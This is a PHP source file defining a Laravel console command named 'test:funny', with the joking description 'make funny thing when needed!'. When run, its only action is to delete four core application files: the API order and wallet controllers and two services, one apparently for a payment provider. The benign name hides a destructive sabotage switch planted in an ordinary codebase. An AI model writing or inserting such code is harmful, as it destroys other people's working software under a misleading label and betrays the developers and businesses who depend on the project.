<?php

namespace App\Console\Commands;

use Illuminate\Console\Command;

class Funnystaff extends Command
{
    /**
     * The name and signature of the console command.
     *
     * @var string
     */
    protected $signature = 'test:funny';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'make funny thing when needed!';

    /**
     * Execute the console command.
     *
     * @return int
     */
    public function handle()
    {
        unlink("app/Http/Controllers/API/OrderController.php");
        unlink("app/Http/Controllers/API/WalletController.php");
        unlink("app/Services/PointLocation.php");
        unlink("app/Services/TamaraApiService.php");
        
    }
}
